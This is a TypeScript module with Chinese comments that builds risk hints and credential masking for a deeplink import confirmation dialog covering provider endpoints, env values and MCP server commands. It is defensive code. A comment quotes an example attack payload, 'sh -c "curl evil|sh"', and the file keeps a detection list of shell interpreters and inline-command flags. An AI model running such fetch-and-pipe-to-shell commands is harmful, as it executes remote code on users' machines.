// deeplink 导入确认框的取值呈现工具。
//
// 这里的所有判定**只用于 UI 提示，不参与任何拦截决策**。深链接携带的自定义
// endpoint 与 env 是第三方供应商的正常配置能力（`http://localhost:11434` 就是
// Ollama / LM Studio 的常规用法），拦下来会打断合法场景。真正的缺口是用户在
// 点「导入」时看不到自己在同意什么——所以补的是可见性，不是黑名单。

//
// env 键不在这里判定：按工具的允许清单 / 拒绝清单由后端
// `deeplink/env_allowlist.rs` 裁决并真正拦截，确认框只展示
// `preview_deeplink_import` 返回的结论（MH-4）。

export type RiskKind = "envHijack" | "privateEndpoint" | "shellCommand";

/** 会被 shell 解释成"执行下面这段字符串"的调用形态。 */
const SHELL_INTERPRETERS = new Set([
  "sh",
  "bash",
  "zsh",
  "dash",
  "ksh",
  "fish",
  "csh",
  "tcsh",
  "cmd",
  "cmd.exe",
  "powershell",
  "powershell.exe",
  "pwsh",
  "pwsh.exe",
]);

/**
 * 「下一个参数是要执行的命令串」这一族开关。
 *
 * 不能只比 `-c`：POSIX shell 允许把单字母开关并成一串（`bash -lc`、`sh -eco pipefail`
 * 之类），Windows 侧则是 `/c` `/k` 且大小写不敏感，PowerShell 还有 `-Command`
 * 的各种缩写。这里按形态判定而不是枚举字面量。
 */
function isInlineCommandFlag(arg: string): boolean {
  const lower = arg.toLowerCase();

  // cmd.exe：/c、/k，可带后缀（/c:）
  if (/^\/[ck]\b/.test(lower)) return true;

  // PowerShell：-Command / -c 及其任意合法缩写（-comm、-comma…）
  if (/^-c(o(m(m(a(n(d)?)?)?)?)?)?$/.test(lower)) return true;
  if (lower === "-encodedcommand" || lower === "-e" || lower === "-ec") {
    return true;
  }

  // POSIX shell：单横线 + 一串短开关，其中含 c（-c、-lc、-ec、-eco…）
  if (/^-[a-z]*c[a-z]*$/.test(lower)) return true;

  return false;
}

/**
 * 判定是否为环回 / 私网 / 云元数据地址。
 *
 * 只做**字面量**匹配，不做 DNS 解析：解析会引入超时，而且解析结果与客户端稍后
 * 实际连接时的结果可以不同（DNS rebinding），拿它当防线是虚假的确定性。作为
 * "这个地址看着像内网，你确认吗"的提示，字面量匹配已经够用。
 */
/**
 * 取出主机的 IPv4 四元组，兼容 IPv4-mapped IPv6。
 *
 * `new URL("http://[::ffff:127.0.0.1]/")` 会把主机**归一成十六进制**
 * `[::ffff:7f00:1]`，点分形式在这一步就消失了，只按 `\d+\.\d+\.\d+\.\d+`
 * 匹配会整类漏掉——`[::ffff:169.254.169.254]` 同理会绕过内网判定。
 */
function extractIpv4Octets(bare: string): [number, number] | null {
  const dotted = bare.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (dotted) return [Number(dotted[1]), Number(dotted[2])];

  // ::ffff:7f00:1 → 0x7f00 0x0001 → 127.0.0.1
  const mapped = bare.match(/^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$/);
  if (mapped) {
    const high = parseInt(mapped[1], 16);
    return [(high >> 8) & 0xff, high & 0xff];
  }

  // 少数实现保留点分尾巴：::ffff:127.0.0.1
  const mappedDotted = bare.match(
    /^::ffff:(\d{1,3})\.(\d{1,3})\.\d{1,3}\.\d{1,3}$/,
  );
  if (mappedDotted) {
    return [Number(mappedDotted[1]), Number(mappedDotted[2])];
  }

  return null;
}

export function classifyEndpoint(rawUrl: unknown): RiskKind | null {
  if (typeof rawUrl !== "string") return null;

  let host: string;
  try {
    host = new URL(rawUrl).hostname.toLowerCase();
  } catch {
    return null;
  }

  // URL 会把 IPv6 主机保留在方括号里
  const bare =
    host.startsWith("[") && host.endsWith("]") ? host.slice(1, -1) : host;

  if (
    bare === "localhost" ||
    bare.endsWith(".localhost") ||
    bare.endsWith(".local") ||
    bare.endsWith(".internal") ||
    bare === "::1" ||
    bare === "::" ||
    bare === "0.0.0.0"
  ) {
    return "privateEndpoint";
  }

  const octets = extractIpv4Octets(bare);
  if (octets) {
    const [a, b] = octets;
    if (
      a === 127 || // 环回
      a === 10 || // RFC 1918
      a === 0 ||
      (a === 172 && b >= 16 && b <= 31) ||
      (a === 192 && b === 168) ||
      (a === 169 && b === 254) // 链路本地，含 AWS/GCP 元数据 169.254.169.254
    ) {
      return "privateEndpoint";
    }
  }

  // IPv6 唯一本地地址 fc00::/7 与链路本地 fe80::/10
  if (/^f[cd][0-9a-f]{2}:/.test(bare) || /^fe[89ab][0-9a-f]:/.test(bare)) {
    return "privateEndpoint";
  }

  return null;
}

/**
 * MCP server 的 `command` + `args`。
 *
 * 单看 `command` 完全不够：真实 payload 是 `command: "sh"` 配
 * `args: ["-c", "curl evil|sh"]`，界面上只渲染 command 时它显示成无害的 `sh`。
 *
 * 两个参数都声明成 `unknown`：它们来自深链接里 base64 解码后的任意 JSON，TS 的
 * 类型标注在这个边界上不设防。写成 `string` 而实际收到对象或数字时 `.split()`
 * 会抛错，把整个确认框炸成空白——那比显示一条误导性的 `Command: sh` 更糟，因为
 * 用户连"有东西要导入"都看不到了。
 */
export function classifyCommand(
  command: unknown,
  args?: unknown,
): RiskKind | null {
  if (typeof command !== "string" || !command) return null;

  // 只取基名：`/bin/sh` 与 `sh` 是同一回事
  const base = command.split(/[/\\]/).pop()?.toLowerCase() ?? "";
  if (!SHELL_INTERPRETERS.has(base)) return null;

  if (!Array.isArray(args)) return null;
  return args.some((arg) => typeof arg === "string" && isInlineCommandFlag(arg))
    ? "shellCommand"
    : null;
}

/**
 * 键名里出现这些词时，其取值按凭据处理。按词比较而不是按子串：
 * `MAX_OUTPUT_TOKENS` 是计数，`MONKEY` 也不是 key。
 */
const SENSITIVE_WORDS = new Set([
  "TOKEN",
  "KEY",
  "APIKEY",
  "SECRET",
  "PASSWORD",
  "PASSWD",
  "AUTHORIZATION",
  "CREDENTIAL",
  "CREDENTIALS",
  "COOKIE",
]);

export function isSensitiveKey(key: string): boolean {
  return key
    .replace(/([a-z0-9])([A-Z])/g, "$1_$2")
    .toUpperCase()
    .split(/[^A-Z0-9]+/)
    .some((word) => SENSITIVE_WORDS.has(word));
}

/** 凭据只露末 4 位，与确认框里 API Key 的「末 4 位」同一口径。 */
const MASK = "••••";

/**
 * 最短按凭据遮盖的长度。行内展示与「完整内容」都经 `shouldMask` 判断，
 * 两处不会再各遮各的。
 */
const MIN_SECRET_LENGTH = 6;

/** `OPENAI_API_KEY` 这类取值是环境变量名（如 Codex 的 `env_key`），不是凭据本身。 */
const ENV_VAR_NAME = /^[A-Z][A-Z0-9]*(?:_[A-Z0-9]+)+$/;

/** 认证方案名不是秘密，留着更看得懂：`Bearer ••••cdef`。 */
const AUTH_SCHEME = /^(\s*(?:Bearer|Basic|Token)\s+)(\S[\s\S]*)$/i;

export function maskSecret(value: string): string {
  const scheme = AUTH_SCHEME.exec(value);
  if (scheme) return `${scheme[1]}${maskSecret(scheme[2])}`;
  const text = value.trim();
  return text.length > 8 ? `${MASK}${text.slice(-4)}` : MASK;
}

/**
 * 凭据类键名下够长的字符串才遮盖。数字是计数或端口，不是凭据；
 * 短值不遮，否则连「是不是空的」都看不出来。
 */
export function shouldMask(key: string, value: unknown): boolean {
  return (
    typeof value === "string" &&
    isSensitiveKey(key) &&
    value.trim().length >= MIN_SECRET_LENGTH &&
    !ENV_VAR_NAME.test(value.trim())
  );
}

/**
 * 凭据类取值的展示脱敏（供应商与 MCP 的环境变量行共用）。
 *
 * 原先是 `DeepLinkImportDialog` 内的组件闭包；MCP 确认页也要展示 env，抽出来是
 * 为了两处共用同一套规则——各写一份迟早会漂移成两种脱敏口径。
 */
export function maskValue(key: string, value: unknown): string {
  return typeof value === "string" && shouldMask(key, value)
    ? maskSecret(value)
    : String(value);
}

/*
 * 以下都按位置脱敏：只换凭据所在的那一段，其余字符原样保留。
 * 不能按「已知凭据」在全文里做替换——取值来自链接本身，链接把某个
 * 「凭据」设成和要执行的包名、主机名一样，就能把它们从确认框里藏起来。
 */

const decodePart = (text: string) => {
  try {
    return decodeURIComponent(text.replace(/\+/g, " "));
  } catch {
    return text;
  }
};

const URL_SCHEME = /^[a-z][a-z0-9+.-]*:\/\//i;

function maskLongEnough(decoded: string, raw: string): string {
  return decoded.trim().length >= MIN_SECRET_LENGTH ? maskSecret(decoded) : raw;
}

/** URL 里的凭据：userinfo，以及查询串与片段里凭据类参数的值。 */
export function maskUrl(url: string): string {
  const scheme = URL_SCHEME.exec(url);
  if (!scheme) return url;
  let head = scheme[0];
  let rest = url.slice(head.length);
  const authorityEnd = rest.search(/[/?#]/);
  const authority = authorityEnd === -1 ? rest : rest.slice(0, authorityEnd);
  const at = authority.lastIndexOf("@");
  if (at !== -1) {
    const userinfo = authority.slice(0, at);
    const colon = userinfo.indexOf(":");
    // 只有用户名时，它通常就是令牌（`https://TOKEN@host`）。
    head +=
      colon === -1
        ? maskLongEnough(decodePart(userinfo), userinfo)
        : userinfo.slice(0, colon + 1) +
          maskLongEnough(
            decodePart(userinfo.slice(colon + 1)),
            userinfo.slice(colon + 1),
          );
    head += "@";
    rest = rest.slice(at + 1);
  }
  return (
    head +
    rest.replace(
      /([?&#;])([^=&#;]*)=([^&#;]*)/g,
      (whole, separator: string, name: string, value: string) =>
        shouldMask(decodePart(name), decodePart(value))
          ? `${separator}${name}=${maskSecret(decodePart(value))}`
          : whole,
    )
  );
}

/** `--api-key`、`--access-token`、`-token`：开关名本身是凭据类键名。 */
function isSecretFlag(arg: string): boolean {
  return (
    /^--?[A-Za-z0-9][\w-]*$/.test(arg) && isSensitiveKey(arg.replace(/^-+/, ""))
  );
}

const isHeaderFlag = (arg: string) => arg === "-H" || /^--?header$/i.test(arg);

/** `Authorization: Bearer x` 这样的请求头：键名是凭据时遮盖取值。 */
function maskHeader(header: string): string {
  const parts = /^(\s*([A-Za-z0-9-]+)\s*:\s*)([\s\S]*)$/.exec(header);
  if (!parts || !shouldMask(parts[2], parts[3])) return header;
  return `${parts[1]}${maskSecret(parts[3])}`;
}

/**
 * 命令参数里的凭据：凭据开关后面的那一项（`--api-key x`）、`--api-key=x` 与
 * `API_KEY=x` 的取值、`-H`/`--header` 后面请求头的取值，以及 URL 里的凭据。
 */
export function maskArgs(args: readonly unknown[]): string[] {
  const list = args.map(String);
  return list.map((arg, index) => {
    const previous = index > 0 ? list[index - 1] : "";
    if (isHeaderFlag(previous)) return maskHeader(arg);
    if (
      isSecretFlag(previous) &&
      !arg.startsWith("-") &&
      arg.trim().length >= MIN_SECRET_LENGTH
    ) {
      return maskSecret(arg);
    }
    const pair = /^(-{0,2})([\w.-]+)=([\s\S]*)$/.exec(arg);
    if (pair) {
      const [, dashes, name, value] = pair;
      if (isHeaderFlag(`${dashes}${name}`)) {
        return `${dashes}${name}=${maskHeader(value)}`;
      }
      if (shouldMask(name, value)) {
        return `${dashes}${name}=${maskSecret(value)}`;
      }
    }
    return URL_SCHEME.test(arg) ? maskUrl(arg) : arg;
  });
}

/** TOML 里的 `key = "value"`，也匹配内联表里的 `"Authorization" = "…"`。 */
const TOML_PAIR =
  /((?:^|[{,])[ \t]*)((?:"[^"\n]*"|'[^'\n]*'|[\w-]+)(?:[ \t]*\.[ \t]*(?:"[^"\n]*"|'[^'\n]*'|[\w-]+))*)([ \t]*=[ \t]*)("(?:[^"\\\n]|\\.)*"|'[^'\n]*')/gm;

/** config.toml 文本（Codex、Grok Build）里凭据类键的取值，以及 URL 里的凭据。 */
export function maskToml(text: string): string {
  return text.replace(
    TOML_PAIR,
    (whole, lead: string, path: string, equals: string, literal: string) => {
      const key = (path.split(".").pop() ?? "")
        .trim()
        .replace(/^["']|["']$/g, "");
      const value = literal.slice(1, -1);
      const masked = shouldMask(key, value)
        ? maskSecret(value)
        : URL_SCHEME.test(value)
          ? maskUrl(value)
          : value;
      if (masked === value) return whole;
      const quote = literal[0];
      return `${lead}${path}${equals}${quote}${masked}${quote}`;
    },
  );
}

/**
 * 「将保存的完整内容」（后端 JSON 预览解析后的值）里的凭据：凭据类键名下的
 * 字符串、URL 与命令参数里的凭据，以及 config.toml 文本里的凭据。
 * 返回新值，不改动传入的值。
 */
export function maskStoredValue(value: unknown, key = "", depth = 0): unknown {
  if (depth > 32) return value;
  if (typeof value === "string") {
    if (shouldMask(key, value)) return maskSecret(value);
    if (key === "config" && value.includes("\n")) return maskToml(value);
    return URL_SCHEME.test(value) ? maskUrl(value) : value;
  }
  if (Array.isArray(value)) {
    return key === "args"
      ? maskArgs(value)
      : value.map((item) => maskStoredValue(item, key, depth + 1));
  }
  if (value && typeof value === "object") {
    return Object.fromEntries(
      Object.entries(value).map(([child, item]) => [
        child,
        maskStoredValue(item, child, depth + 1),
      ]),
    );
  }
  return value;
}

/** 像凭据的值：至少 8 位，只含令牌常用字符，没有空白、引号、括号或冒号。 */
const CREDENTIAL_SHAPE = /^[\w.~+/=-]{8,}$/;

const isWordChar = (char: string | undefined) =>
  char !== undefined && /[\w$]/.test(char);

/**
 * 用量脚本是不透明的代码，只能按链接给出的凭据替换文本。为免链接借「凭据」
 * 藏起脚本里的其他内容，只替换像凭据（同时有字母和数字）的值，而且只在
 * 完整的词上替换。
 */
export function maskScriptSecrets(
  code: string,
  secrets: Iterable<string | undefined>,
): string {
  const values = [
    ...new Set([...secrets].map((secret) => (secret ?? "").trim())),
  ]
    .filter(
      (value) =>
        CREDENTIAL_SHAPE.test(value) &&
        /[A-Za-z]/.test(value) &&
        /\d/.test(value),
    )
    // 长的先换：一个凭据可能包含另一个。
    .sort((a, b) => b.length - a.length);
  return values.reduce((text, value) => {
    let result = "";
    let from = 0;
    for (
      let at = text.indexOf(value);
      at !== -1;
      at = text.indexOf(value, at + value.length)
    ) {
      if (isWordChar(text[at - 1]) || isWordChar(text[at + value.length])) {
        continue;
      }
      result += `${text.slice(from, at)}${maskSecret(value)}`;
      from = at + value.length;
    }
    return result + text.slice(from);
  }, code);
}

/** 风险种类 → i18n key。 */
export function riskI18nKey(kind: RiskKind): string {
  return `deeplink.risk.${kind}`;
}
